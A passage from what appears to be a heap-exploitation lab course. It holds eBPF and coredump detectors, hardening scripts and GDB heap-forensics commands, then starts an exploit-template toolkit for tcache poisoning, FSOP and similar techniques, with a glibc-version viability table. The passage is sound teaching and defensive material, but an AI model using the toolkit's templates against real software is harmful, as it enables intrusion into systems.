#define EVENT_RAPID_BRK     1
#define EVENT_MPROTECT_RWX  2
#define EVENT_SIGABRT       3

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, u32);    /* pid */
    __type(value, u64);  /* last brk timestamp */
} brk_times SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, u32);
    __type(value, u32);  /* rapid brk count */
} brk_counts SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_brk")
int trace_brk(struct trace_event_raw_sys_enter *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 now = bpf_ktime_get_ns();

    u64 *last = bpf_map_lookup_elem(&brk_times, &pid);
    if (last && (now - *last) < 1000000) {  /* < 1ms between brk calls */
        u32 *cnt = bpf_map_lookup_elem(&brk_counts, &pid);
        u32 new_cnt = cnt ? *cnt + 1 : 1;
        bpf_map_update_elem(&brk_counts, &pid, &new_cnt, BPF_ANY);

        if (new_cnt > 100) {
            struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
            if (e) {
                e->pid = pid;
                e->timestamp = now;
                e->event_type = EVENT_RAPID_BRK;
                bpf_get_current_comm(e->comm, sizeof(e->comm));
                bpf_ringbuf_submit(e, 0);
            }
        }
    }
    bpf_map_update_elem(&brk_times, &pid, &now, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_enter_mprotect")
int trace_mprotect(struct trace_event_raw_sys_enter *ctx) {
    unsigned long prot = ctx->args[2];

    /* Detect PROT_READ|PROT_WRITE|PROT_EXEC — classic shellcode setup */
    if ((prot & 7) == 7) {
        struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid = bpf_get_current_pid_tgid() >> 32;
            e->timestamp = bpf_ktime_get_ns();
            e->addr = ctx->args[0];
            e->event_type = EVENT_MPROTECT_RWX;
            bpf_get_current_comm(e->comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

#### Step 9.5: Crash analysis script for heap bugs

```python
#!/usr/bin/env python3
"""heap_crash_analyzer.py — Analyze coredumps for heap exploitation indicators"""

import subprocess
import re
import json
import sys
from pathlib import Path
from datetime import datetime


class HeapCrashAnalyzer:
    GLIBC_ERROR_PATTERNS = {
        'double_free':          r'double free detected',
        'corrupted_top':        r'corrupted top size',
        'unaligned_tcache':     r'unaligned tcache chunk',
        'corrupted_unsorted':   r'corrupted unsorted chunks',
        'invalid_next_size':    r'invalid next size',
        'invalid_pointer':      r'free\(\): invalid pointer',
        'size_vs_prevsize':     r'corrupted size vs\. prev_size',
        'consolidate_invalid':  r'malloc_consolidate.*invalid',
    }

    ASAN_PATTERNS = {
        'heap_uaf':             r'heap-use-after-free',
        'heap_overflow':        r'heap-buffer-overflow',
        'double_free':          r'double-free',
        'stack_overflow':       r'stack-buffer-overflow',
        'alloc_dealloc':        r'alloc-dealloc-mismatch',
    }

    MITRE_MAPPING = {
        'double_free':        {'technique': 'T1203', 'cwe': 'CWE-415'},
        'corrupted_top':      {'technique': 'T1203', 'cwe': 'CWE-122'},
        'heap_uaf':           {'technique': 'T1203', 'cwe': 'CWE-416'},
        'heap_overflow':      {'technique': 'T1203', 'cwe': 'CWE-122'},
        'unaligned_tcache':   {'technique': 'T1203', 'cwe': 'CWE-787'},
        'corrupted_unsorted': {'technique': 'T1203', 'cwe': 'CWE-787'},
    }

    def __init__(self):
        self.findings = []

    def analyze_coredump(self, core_path, binary_path=None):
        """Analyze a coredump for heap exploitation indicators."""
        findings = {'timestamp': datetime.utcnow().isoformat(),
                    'core': str(core_path), 'indicators': []}

        # Extract signal info
        try:
            bt = subprocess.run(
                ['gdb', '-batch', '-ex', 'bt', '-ex', 'info signals',
                 '-ex', 'p $_siginfo', binary_path or '', str(core_path)],
                capture_output=True, text=True, timeout=30
            )
            output = bt.stdout + bt.stderr

            # Check for heap-related crash location
            if re.search(r'malloc|free|tcache|_int_malloc|_int_free|'
                         r'__libc_malloc|__libc_free', output):
                findings['indicators'].append({
                    'type': 'crash_in_allocator',
                    'severity': 'HIGH',
                    'detail': 'Process crashed inside heap allocator code',
                    'mitre': 'T1203'
                })

            # Check for glibc error messages
            for name, pattern in self.GLIBC_ERROR_PATTERNS.items():
                if re.search(pattern, output, re.IGNORECASE):
                    mitre = self.MITRE_MAPPING.get(name, {})
                    findings['indicators'].append({
                        'type': f'glibc_{name}',
                        'severity': 'CRITICAL',
                        'detail': f'glibc heap integrity check failed: {name}',
                        'mitre': mitre.get('technique', 'T1203'),
                        'cwe': mitre.get('cwe', 'CWE-787')
                    })

        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            findings['error'] = str(e)

        self.findings.append(findings)
        return findings

    def analyze_journal(self, since='1h'):
        """Analyze systemd journal for heap crash patterns."""
        try:
            result = subprocess.run(
                ['journalctl', f'--since=-{since}', '--no-pager',
                 '-o', 'json', '--output-fields=MESSAGE,_PID,_COMM,COREDUMP_SIGNAL'],
                capture_output=True, text=True, timeout=30
            )

            crash_map = {}
            for line in result.stdout.strip().split('\n'):
                if not line:
                    continue
                try:
                    entry = json.loads(line)
                except json.JSONDecodeError:
                    continue

                msg = entry.get('MESSAGE', '')
                pid = entry.get('_PID', '')
                comm = entry.get('_COMM', '')
                sig = entry.get('COREDUMP_SIGNAL', '')

                for name, pattern in self.GLIBC_ERROR_PATTERNS.items():
                    if re.search(pattern, msg, re.IGNORECASE):
                        key = f"{comm}:{name}"
                        crash_map.setdefault(key, []).append({
                            'pid': pid, 'signal': sig
                        })

            # Alert on repeated crashes
            for key, crashes in crash_map.items():
                if len(crashes) >= 3:
                    print(f"[ALERT] Repeated heap crash: {key} "
                          f"({len(crashes)} occurrences)")
                    for c in crashes[:5]:
                        print(f"  PID {c['pid']} signal {c['signal']}")

        except Exception as e:
            print(f"[ERROR] Journal analysis failed: {e}")

    def report(self):
        """Generate analysis report."""
        print("\n=== Heap Crash Analysis Report ===")
        print(f"Analyzed: {len(self.findings)} coredumps")
        for f in self.findings:
            print(f"\n--- {f['core']} ---")
            if f.get('error'):
                print(f"  Error: {f['error']}")
                continue
            for ind in f['indicators']:
                print(f"  [{ind['severity']}] {ind['type']}: {ind['detail']}")
                if 'mitre' in ind:
                    print(f"    MITRE: {ind['mitre']}")
                if 'cwe' in ind:
                    print(f"    CWE: {ind['cwe']}")


if __name__ == '__main__':
    analyzer = HeapCrashAnalyzer()

    if len(sys.argv) > 1:
        core = sys.argv[1]
        binary = sys.argv[2] if len(sys.argv) > 2 else None
        analyzer.analyze_coredump(core, binary)
    else:
        analyzer.analyze_journal('24h')

    analyzer.report()
```

---

### Exercise 10: Compiler and Allocator Hardening

**Objective:** Deploy allocator hardening, build configurations, and runtime protections.

#### Step 10.1: Hardened build configuration

```bash
#!/bin/bash
# hardened_heap_build.sh — Maximum heap protection build flags

set -euo pipefail

SRC="${1:?Usage: $0 source.c}"
OUT="${SRC%.c}_hardened"

echo "[*] Building with maximum heap protection..."

gcc "$SRC" -o "$OUT" \
    -D_FORTIFY_SOURCE=3 \
    -fstack-protector-strong \
    -fstack-clash-protection \
    -fcf-protection=full \
    -ftrivial-auto-var-init=zero \
    -pie -fPIE \
    -Wl,-z,relro,-z,now \
    -Wl,-z,noexecstack \
    -Wl,-z,separate-code \
    -O2 -g \
    -Wall -Wextra -Werror \
    -Wformat=2 -Wformat-security \
    -Wimplicit-fallthrough \
    -Wstrict-overflow=5 \
    -Warray-bounds=2

echo "[+] Built: $OUT"
echo "[*] Protection analysis:"
checksec --file="$OUT" 2>/dev/null || \
    python3 -c "from pwn import *; print(ELF('$OUT').checksec())" 2>/dev/null
```

#### Step 10.2: Binary heap protection verifier

```python
#!/usr/bin/env python3
"""heap_protection_audit.py — Audit binary for heap exploitation mitigations"""

import subprocess
import re
import sys
from pathlib import Path


class HeapProtectionAuditor:
    CHECKS = {
        'full_relro': {
            'description': 'Full RELRO (GOT read-only after startup)',
            'severity': 'CRITICAL',
            'check': 'relro'
        },
        'pie': {
            'description': 'Position Independent Executable',
            'severity': 'HIGH',
            'check': 'pie'
        },
        'stack_canary': {
            'description': 'Stack canary (stack protector)',
            'severity': 'HIGH',
            'check': 'canary'
        },
        'nx': {
            'description': 'NX bit (non-executable stack)',
            'severity': 'CRITICAL',
            'check': 'nx'
        },
        'fortify': {
            'description': 'FORTIFY_SOURCE (buffer overflow detection)',
            'severity': 'MEDIUM',
            'check': 'fortify'
        }
    }

    def __init__(self, binary_path):
        self.binary = Path(binary_path)
        self.results = {}

    def check_protections(self):
        """Run checksec-style analysis."""
        try:
            from pwn import ELF
            e = ELF(str(self.binary), checksec=False)

            self.results['relro'] = 'Full' if e.relro == 'Full' else e.relro or 'None'
            self.results['pie'] = bool(e.pie)
            self.results['canary'] = e.canary
            self.results['nx'] = e.nx
            self.results['fortify'] = self._check_fortify()
        except ImportError:
            self._check_with_readelf()

    def _check_fortify(self):
        """Check for FORTIFY_SOURCE functions."""
        try:
            result = subprocess.run(
                ['nm', '-D', str(self.binary)],
                capture_output=True, text=True
            )
            fortified = [l for l in result.stdout.split('\n')
                         if '_chk' in l or '__fortify' in l.lower()]
            return len(fortified) > 0
        except Exception:
            return False

    def _check_with_readelf(self):
        """Fallback: use readelf for protection checks."""
        result = subprocess.run(
            ['readelf', '-d', '-l', str(self.binary)],
            capture_output=True, text=True
        )
        output = result.stdout

        self.results['relro'] = 'Full' if 'BIND_NOW' in output else \
                                'Partial' if 'GNU_RELRO' in output else 'None'
        self.results['pie'] = 'DYN' in output
        self.results['nx'] = 'GNU_STACK' in output and 'RWE' not in output

        syms = subprocess.run(
            ['readelf', '-s', str(self.binary)],
            capture_output=True, text=True
        )
        self.results['canary'] = '__stack_chk_fail' in syms.stdout
        self.results['fortify'] = '_chk@' in syms.stdout

    def check_dangerous_functions(self):
        """Identify dangerous heap-related functions."""
        dangerous = {
            'gets': 'CRITICAL — unbounded read, guaranteed overflow',
            'sprintf': 'HIGH — no bounds check on output buffer',
            'strcat': 'HIGH — no bounds check on concatenation',
            'strcpy': 'HIGH — no bounds check on copy',
            'realloc': 'MEDIUM — integer overflow in size calculation',
            'alloca': 'MEDIUM — stack exhaustion, no bounds',
        }

        try:
            result = subprocess.run(
                ['nm', '-D', str(self.binary)],
                capture_output=True, text=True
            )
            found = {}
            for func, risk in dangerous.items():
                if re.search(rf'\b{func}(@|$)', result.stdout):
                    found[func] = risk
            return found
        except Exception:
            return {}

    def check_glibc_version(self):
        """Determine linked glibc version."""
        try:
            result = subprocess.run(
                ['ldd', str(self.binary)],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'libc.so' in line:
                    libc_path = line.split('=>')[1].split('(')[0].strip()
                    ver = subprocess.run(
                        [libc_path],
                        capture_output=True, text=True
                    )
                    match = re.search(r'(\d+\.\d+)', ver.stdout)
                    if match:
                        return match.group(1)
        except Exception:
            pass
        return 'unknown'

    def report(self):
        """Generate audit report."""
        self.check_protections()
        dangerous = self.check_dangerous_functions()
        glibc_ver = self.check_glibc_version()

        print(f"\n=== Heap Protection Audit: {self.binary.name} ===")
        print(f"glibc version: {glibc_ver}\n")

        all_pass = True
        for check_id, check_info in self.CHECKS.items():
            key = check_info['check']
            val = self.results.get(key, 'unknown')
            if key == 'relro':
                passed = val == 'Full'
            else:
                passed = bool(val)

            status = 'PASS' if passed else 'FAIL'
            if not passed:
                all_pass = False
            print(f"  [{status}] {check_info['description']}: {val}")

        if dangerous:
            print(f"\n  Dangerous functions detected:")
            for func, risk in dangerous.items():
                print(f"    {func}(): {risk}")
            all_pass = False

        # Version-specific exploitation analysis
        print(f"\n  Exploitation landscape (glibc {glibc_ver}):")
        ver = tuple(int(x) for x in glibc_ver.split('.')) if glibc_ver != 'unknown' else (0, 0)
        if ver < (2, 29):
            print("    [!] House of Force: VIABLE")
            print("    [!] Unsorted bin attack: VIABLE")
        if ver < (2, 32):
            print("    [!] Tcache poisoning: TRIVIAL (no safe-linking)")
        elif ver < (2, 34):
            print("    [*] Tcache poisoning: requires heap leak (safe-linking)")
            print("    [!] __malloc_hook overwrite: VIABLE")
        else:
            print("    [*] Tcache poisoning: requires heap leak (safe-linking)")
            print("    [+] __malloc_hook: REMOVED")
            print("    [*] Code exec targets: FSOP, __exit_funcs, TLS")

        verdict = "PASS" if all_pass else "NEEDS REMEDIATION"
        print(f"\n  Overall: {verdict}")
        return all_pass


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)

    auditor = HeapProtectionAuditor(sys.argv[1])
    passed = auditor.report()
    sys.exit(0 if passed else 1)
```

#### Step 10.3: Runtime sysctl hardening for heap exploitation resistance

```bash
#!/bin/bash
# heap_sysctl_hardening.sh — Kernel parameters to resist heap exploitation

set -euo pipefail

echo "[*] Applying heap exploitation hardening sysctls..."

# ASLR: maximum randomization (heap, stack, mmap, VDSO)
sysctl -w kernel.randomize_va_space=2

# Prevent ptrace-based heap inspection by unprivileged processes
sysctl -w kernel.yama.ptrace_scope=1

# Restrict core dumps (prevent heap state leakage)
sysctl -w fs.suid_dumpable=0

# Restrict kernel pointer leaks
sysctl -w kernel.kptr_restrict=2

# Restrict dmesg (may leak kernel heap addresses)
sysctl -w kernel.dmesg_restrict=1

# Restrict unprivileged user namespaces (prevent container escape via heap bugs)
sysctl -w kernel.unprivileged_userns_clone=0 2>/dev/null || \
    echo "[!] unprivileged_userns_clone not available on this kernel"

# Restrict eBPF (prevent heap inspection via BPF)
sysctl -w kernel.unprivileged_bpf_disabled=1

# Restrict perf events
sysctl -w kernel.perf_event_paranoid=3

echo "[+] Hardening applied."
echo ""
echo "=== Current heap-relevant sysctl values ==="
for key in kernel.randomize_va_space kernel.yama.ptrace_scope \
           fs.suid_dumpable kernel.kptr_restrict kernel.dmesg_restrict \
           kernel.unprivileged_bpf_disabled kernel.perf_event_paranoid; do
    printf "  %-45s = %s\n" "$key" "$(sysctl -n $key 2>/dev/null || echo 'N/A')"
done
```

---

### Exercise 11: GDB Heap Forensics Automation

**Objective:** Automate heap state reconstruction and corruption detection in GDB.

#### Step 11.1: GDB Python heap analysis commands

```python
#!/usr/bin/env python3
"""gdb_heap_forensics.py — GDB Python script for heap corruption detection
Load in GDB: source gdb_heap_forensics.py"""

import gdb
import struct

class HeapForensics(gdb.Command):
    """Automated heap state analysis and corruption detection."""

    def __init__(self):
        super().__init__("heap-forensics", gdb.COMMAND_DATA)

    def invoke(self, arg, from_tty):
        self.analyze_arena()
        self.check_tcache()
        self.check_fastbins()
        self.check_unsorted_bin()

    def read_qword(self, addr):
        try:
            inferior = gdb.selected_inferior()
            mem = inferior.read_memory(addr, 8)
            return struct.unpack('<Q', bytes(mem))[0]
        except Exception:
            return None

    def analyze_arena(self):
        print("\n=== Main Arena Analysis ===")
        try:
            arena = gdb.parse_and_eval('main_arena')
            top = int(arena['top'])
            print(f"  Top chunk: {hex(top)}")

            top_size = self.read_qword(top + 8)
            if top_size:
                print(f"  Top chunk size: {hex(top_size)}")
                if top_size == 0xFFFFFFFFFFFFFFFF:
                    print("  [CRITICAL] Top chunk size is -1! House of Force detected!")
                elif top_size > 0x100000000:
                    print(f"  [WARNING] Top chunk size suspiciously large")
        except Exception as e:
            print(f"  Error: {e}")

    def check_tcache(self):
        print("\n=== Tcache Analysis ===")
        try:
            # tcache_perthread_struct is typically the first heap allocation
            # Find heap base from /proc/pid/maps
            pid = gdb.selected_inferior().pid
            with open(f'/proc/{pid}/maps', 'r') as f:
                for line in f:
                    if '[heap]' in line:
                        heap_base = int(line.split('-')[0], 16)
                        break
                else:
                    print("  Heap not found in maps")
                    return

            # tcache_perthread_struct starts at heap_base + 0x10
            tcache = heap_base + 0x10

            # counts: 64 x uint16_t (128 bytes)
            # entries: 64 x pointer (512 bytes)
            for i in range(64):
                count_addr = tcache + i * 2
                count = struct.unpack('<H',
                    bytes(gdb.selected_inferior().read_memory(count_addr, 2)))[0]

                if count > 0:
                    entry_addr = tcache + 128 + i * 8
                    entry = self.read_qword(entry_addr)
                    size = (i + 2) * 16  # tcache bin index to chunk size
                    print(f"  Bin[{i}] size=0x{size:x}: count={count}, "
                          f"head=0x{entry:x}")

                    # Check for suspicious entries
                    if entry and (entry < heap_base or
                                  entry > heap_base + 0x10000000):
                        print(f"    [WARNING] Entry points outside heap!")

                    if count > 7:
                        print(f"    [WARNING] Count > 7 (max TCACHE_FILL_COUNT)")

        except Exception as e:
            print(f"  Error: {e}")

    def check_fastbins(self):
        print("\n=== Fastbin Analysis ===")
        try:
            arena = gdb.parse_and_eval('main_arena')
            for i in range(10):
                head = int(arena['fastbinsY'][i])
                if head:
                    size = (i + 2) * 16
                    print(f"  Fastbin[{i}] size=0x{size:x}: head=0x{head:x}")

                    # Walk the fastbin chain (max 100 entries to avoid infinite loops)
                    current = head
                    visited = set()
                    depth = 0
                    while current and depth < 100:
                        if current in visited:
                            print(f"    [CRITICAL] Cycle detected at "
                                  f"0x{current:x}! Double-free/fastbin dup!")
                            break
                        visited.add(current)
                        # fd is at current + 0x10 (user data area)
                        fd = self.read_qword(current + 0x10)
                        if fd is None:
                            break
                        current = fd
                        depth += 1

                    if depth >= 100:
                        print(f"    [WARNING] Fastbin chain > 100 entries")

        except Exception as e:
            print(f"  Error: {e}")

    def check_unsorted_bin(self):
        print("\n=== Unsorted Bin Analysis ===")
        try:
            arena = gdb.parse_and_eval('main_arena')
            # Unsorted bin is bins[1] → bins[0..1] at offset
            # bins array: bins[NBINS * 2 - 2]
            # unsorted_bin fd = bins[0], bk = bins[1]
            bins_addr = int(arena['bins'][0].address)
            fd = self.read_qword(bins_addr)
            bk = self.read_qword(bins_addr + 8)

            if fd != bins_addr or bk != bins_addr:
                print(f"  Unsorted bin is non-empty")
                print(f"    fd = 0x{fd:x}")
                print(f"    bk = 0x{bk:x}")

                # Walk the unsorted bin
                current = fd
                count = 0
                while current != bins_addr and count < 50:
                    chunk_size = self.read_qword(current + 8)
                    if chunk_size:
                        actual_size = chunk_size & ~0x7
                        print(f"    Chunk at 0x{current:x}: "
                              f"size=0x{actual_size:x}")
                    current_fd = self.read_qword(current + 0x10)
                    if current_fd is None:
                        break
                    current = current_fd
                    count += 1
            else:
                print("  Unsorted bin is empty")

        except Exception as e:
            print(f"  Error: {e}")


class HeapChunkCmd(gdb.Command):
    """Examine a single heap chunk in detail."""

    def __init__(self):
        super().__init__("heap-chunk", gdb.COMMAND_DATA)

    def invoke(self, arg, from_tty):
        if not arg:
            print("Usage: heap-chunk <address>")
            return

        addr = int(gdb.parse_and_eval(arg))
        inferior = gdb.selected_inferior()

        # Read chunk header (at addr - 0x10 if given user pointer)
        # Heuristic: if addr looks like it has metadata, treat as chunk start
        chunk_addr = addr
        mem = bytes(inferior.read_memory(chunk_addr, 0x40))
        prev_size, size = struct.unpack('<QQ', mem[:16])

        flags = size & 0x7
        actual_size = size & ~0x7

        print(f"\n=== Chunk at 0x{chunk_addr:x} ===")
        print(f"  prev_size: 0x{prev_size:x}")
        print(f"  size:      0x{size:x} (actual: 0x{actual_size:x})")
        print(f"  flags:     P={flags&1} M={(flags>>1)&1} A={(flags>>2)&1}")

        # User data starts at chunk_addr + 0x10
        user_data = chunk_addr + 0x10
        fd = struct.unpack('<Q', mem[0x10:0x18])[0]
        bk = struct.unpack('<Q', mem[0x18:0x20])[0]

        print(f"  user_data: 0x{user_data:x}")
        print(f"  fd/next:   0x{fd:x}")
        print(f"  bk/key:    0x{bk:x}")

        # Detect if chunk appears free (PREV_INUSE of next chunk is clear)
        if actual_size > 0 and actual_size < 0x100000:
            next_chunk = chunk_addr + actual_size
            try:
                next_mem = bytes(inferior.read_memory(next_chunk + 8, 8))
                next_size = struct.unpack('<Q', next_mem)[0]
                if not (next_size & 1):
                    print(f"  [INFO] Next chunk's PREV_INUSE is clear — "
                          f"this chunk appears FREE")
            except Exception:
                pass


# Register commands
HeapForensics()
HeapChunkCmd()
print("[+] Heap forensics commands loaded: heap-forensics, heap-chunk")
```

---

## PART C: FRAMEWORK DEVELOPMENT

### HeapExploitLab — Reusable Exploitation Toolkit

#### setup.py

```python
from setuptools import setup, find_packages

setup(
    name='heapexploitlab',
    version='1.0.0',
    description='Heap exploitation lab toolkit — educational use only',
    packages=find_packages(),
    python_requires='>=3.8',
    install_requires=[
        'pwntools>=4.10',
    ],
    entry_points={
        'console_scripts': [
            'heaplab=heapexploitlab.cli:main',
        ],
    },
)
```

#### heapexploitlab/cli.py

```python
#!/usr/bin/env python3
"""HeapExploitLab CLI — Heap analysis, template generation, and auditing."""

import argparse
import sys


def cmd_analyze(args):
    from .analyzer import HeapBinaryAnalyzer
    analyzer = HeapBinaryAnalyzer(args.binary)
    analyzer.full_analysis(deep=args.deep)
    analyzer.report()


def cmd_template(args):
    from .template_gen import HeapExploitTemplateGenerator
    gen = HeapExploitTemplateGenerator(
        binary=args.binary,
        exploit_type=args.type,
        glibc_version=args.glibc
    )
    code = gen.generate()
    if args.output:
        with open(args.output, 'w') as f:
            f.write(code)
        print(f"[+] Template written to {args.output}")
    else:
        print(code)


def cmd_audit(args):
    from .audit import HeapSecurityAuditor
    auditor = HeapSecurityAuditor(args.binary)
    passed = auditor.audit()
    sys.exit(0 if passed else 1)


def cmd_glibc_info(args):
    from .glibc_info import GlibcVersionInfo
    info = GlibcVersionInfo(args.version)
    info.print_compatibility()


def cmd_safelink(args):
    from .safelink import SafeLinkingTool
    tool = SafeLinkingTool()
    if args.encode:
        addr, target = args.encode
        result = tool.encode(int(addr, 16), int(target, 16))
        print(f"Encoded: {hex(result)}")
    elif args.decode:
        addr, encoded = args.decode
        result = tool.decode(int(addr, 16), int(encoded, 16))
        print(f"Decoded: {hex(result)}")
    elif args.leak_key:
        encoded_null = int(args.leak_key, 16)
        key = tool.extract_key(encoded_null)
        print(f"Heap page key: {hex(key)}")


def main():
    parser = argparse.ArgumentParser(
        description='HeapExploitLab — Heap exploitation toolkit')
    sub = parser.add_subparsers(dest='command')

    # analyze
    p_analyze = sub.add_parser('analyze', help='Analyze binary heap protections')
    p_analyze.add_argument('binary')
    p_analyze.add_argument('--deep', action='store_true',
                           help='Deep analysis with gadget search')
    p_analyze.set_defaults(func=cmd_analyze)

    # template
    p_template = sub.add_parser('template', help='Generate exploit template')
    p_template.add_argument('binary')
    p_template.add_argument('--type', required=True,
                            choices=['tcache_poison', 'fastbin_dup', 'uaf',
                                     'house_of_force', 'house_of_spirit',
                                     'unsorted_bin', 'fsop', 'vtable_hijack'])
    p_template.add_argument('--glibc', default='2.35',
                            help='Target glibc version')
    p_template.add_argument('-o', '--output', help='Output file')
    p_template.set_defaults(func=cmd_template)

    # audit
    p_audit = sub.add_parser('audit', help='Security audit of binary')
    p_audit.add_argument('binary')
    p_audit.set_defaults(func=cmd_audit)

    # glibc-info
    p_glibc = sub.add_parser('glibc-info',
                             help='Show glibc version exploitation compatibility')
    p_glibc.add_argument('version', help='glibc version (e.g., 2.35)')
    p_glibc.set_defaults(func=cmd_glibc_info)

    # safelink
    p_safe = sub.add_parser('safelink', help='Safe-linking encode/decode')
    p_safe.add_argument('--encode', nargs=2, metavar=('ADDR', 'TARGET'),
                        help='Encode: PROTECT_PTR(addr, target)')
    p_safe.add_argument('--decode', nargs=2, metavar=('ADDR', 'ENCODED'),
                        help='Decode: REVEAL_PTR(addr, encoded)')
    p_safe.add_argument('--leak-key', metavar='ENCODED_NULL',
                        help='Extract heap key from encoded NULL')
    p_safe.set_defaults(func=cmd_safelink)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        return

    args.func(args)


if __name__ == '__main__':
    main()
```

#### heapexploitlab/analyzer.py

```python
"""Binary analysis for heap exploitation viability."""

import subprocess
import re
from pathlib import Path


class HeapBinaryAnalyzer:
    DANGEROUS_HEAP_FUNCS = {
        'gets':     'CRITICAL — unbounded heap write possible',
        'sprintf':  'HIGH — format to heap without bounds',
        'strcpy':   'HIGH — unbounded copy to heap',
        'strcat':   'HIGH — unbounded concatenation',
        'memcpy':   'INFO — safe if size is correct',
        'realloc':  'MEDIUM — integer overflow in size arg',
        'calloc':   'MEDIUM — integer overflow in nmemb*size',
        'reallocarray': 'LOW — safe realloc variant',
    }

    def __init__(self, binary_path):
        self.binary = Path(binary_path)
        self.protections = {}
        self.functions = {}
        self.dangerous = {}
        self.glibc_version = 'unknown'

    def full_analysis(self, deep=False):
        self._check_protections()
        self._find_functions()
        self._check_dangerous()
        self._detect_glibc()
        if deep:
            self._search_gadgets()

    def _check_protections(self):
        try:
            from pwn import ELF
            e = ELF(str(self.binary), checksec=False)
            self.protections = {
                'relro': 'Full' if e.relro == 'Full' else e.relro or 'None',
                'pie': bool(e.pie),
                'canary': e.canary,
                'nx': e.nx,
            }
        except ImportError:
            self.protections = {'error': 'pwntools not available'}

    def _find_functions(self):
        result = subprocess.run(
            ['nm', '-D', str(self.binary)],
            capture_output=True, text=True
        )
        for line in result.stdout.split('\n'):
            parts = line.split()
            if len(parts) >= 3:
                self.functions[parts[2]] = parts[0]

    def _check_dangerous(self):
        for func, risk in self.DANGEROUS_HEAP_FUNCS.items():
            if func in self.functions or f'{func}@@' in ' '.join(self.functions.keys()):
                self.dangerous[func] = risk

    def _detect_glibc(self):
        try:
            result = subprocess.run(
                ['ldd', str(self.binary)], capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'libc.so' in line:
                    libc_path = line.split('=>')[1].split('(')[0].strip()
                    ver_out = subprocess.run(
                        [libc_path], capture_output=True, text=True
                    )
                    match = re.search(r'(\d+\.\d+)', ver_out.stdout)
                    if match:
                        self.glibc_version = match.group(1)
        except Exception:
            pass

    def _search_gadgets(self):
        pass  # Would use ROPgadget for deep analysis

    def report(self):
        print(f"\n=== Heap Exploitation Analysis: {self.binary.name} ===")
        print(f"glibc: {self.glibc_version}")

        print("\nProtections:")
        for k, v in self.protections.items():
            print(f"  {k}: {v}")

        if self.dangerous:
            print("\nDangerous functions:")
            for func, risk in self.dangerous.items():
                print(f"  {func}(): {risk}")

        ver = tuple(int(x) for x in self.glibc_version.split('.')) \
              if self.glibc_version != 'unknown' else (0, 0)

        print("\nViable techniques:")
        techniques = {
            'Tcache poisoning': 'TRIVIAL' if ver < (2, 32) else 'NEEDS HEAP LEAK',
            'Fastbin dup': 'TRIVIAL' if ver < (2, 32) else 'NEEDS HEAP LEAK',
            'House of Force': 'VIABLE' if ver < (2, 29) else 'DEAD',
            'Unsorted bin attack': 'VIABLE' if ver < (2, 29) else 'DEAD',
            '__malloc_hook': 'VIABLE' if ver < (2, 34) else 'REMOVED',
            'FSOP (_IO_FILE)': 'HARD' if ver >= (2, 35) else 'VIABLE',
            'House of Einherjar': 'VIABLE (constraints)' if ver < (2, 39)
                                   else 'PARTIAL',
        }
        for tech, status in techniques.items():
            marker = '[!]' if 'VIABLE' in status or 'TRIVIAL' in status else '[+]'
            print(f"  {marker} {tech}: {status}")
```

#### heapexploitlab/template_gen.py

```python
"""Generate pwntools exploit templates for various heap techniques."""


class HeapExploitTemplateGenerator:
    def __init__(self, binary, exploit_type, glibc_version='2.35'):
        self.binary = binary
        self.exploit_type = exploit_type
        self.glibc_ver = tuple(int(x) for x in glibc_version.split('.'))

    def generate(self):
        generators = {
            'tcache_poison': self._gen_tcache_poison,
            'fastbin_dup': self._gen_fastbin_dup,
            'uaf': self._gen_uaf,
            'house_of_force': self._gen_house_of_force,
            'house_of_spirit': self._gen_house_of_spirit,
            'unsorted_bin': self._gen_unsorted_bin,
            'fsop': self._gen_fsop,
            'vtable_hijack': self._gen_vtable_hijack,
        }
        gen = generators.get(self.exploit_type)
        if not gen:
            raise ValueError(f"Unknown exploit type: {self.exploit_type}")
        return gen()

    def _header(self):
        return f'''#!/usr/bin/env python3
"""Auto-generated heap exploit template: {self.exploit_type}
Target: {self.binary}
glibc: {".".join(str(x) for x in self.glibc_ver)}
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('{self.binary}')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
'''

    def _safe_linking_helpers(self):
        if self.glibc_ver >= (2, 32):
            return '''
def protect_ptr(pos, ptr):
    """Safe-linking encode (glibc 2.32+)"""
    return (pos >> 12) ^ ptr

def reveal_ptr(pos, encoded):
    """Safe-linking decode"""
    return protect_ptr(pos, encoded)

def leak_heap_key(encoded_null):
    """Extract key from encoded NULL in single-entry tcache bin"""
    return encoded_null
'''
        return ''

    def _gen_tcache_poison(self):
        return self._header() + self._safe_linking_helpers() + '''
p = process(elf.path)

# === STEP 1: Information disclosure ===
# Leak heap address (for safe-linking) and libc address
# TODO: adapt leak functions to your binary's interface

# heap_leak = ...  # heap address for safe-linking key
# libc_leak = ...  # libc address for target resolution

# === STEP 2: UAF or overflow to corrupt tcache next pointer ===
# Allocate and free a chunk to place it in tcache
# Then corrupt its next pointer via UAF write or overflow

ALLOC_SIZE = 0x20  # Adjust to target tcache bin

# alloc(ALLOC_SIZE)  → chunk A
# free(A)
# uaf_write(A, encoded_target)

# === STEP 3: Drain tcache and get arbitrary allocation ===
# alloc(ALLOC_SIZE)  → returns A (head)
# alloc(ALLOC_SIZE)  → returns target (poisoned next)

# === STEP 4: Write payload at target ===
# For glibc < 2.34: overwrite __malloc_hook with one_gadget
# For glibc 2.34+: FSOP chain or __exit_funcs

# target = libc_base + libc.sym['__free_hook']  # pre-2.34
# target = libc_base + libc.sym['_IO_list_all']  # post-2.34

p.interactive()
'''

    def _gen_uaf(self):
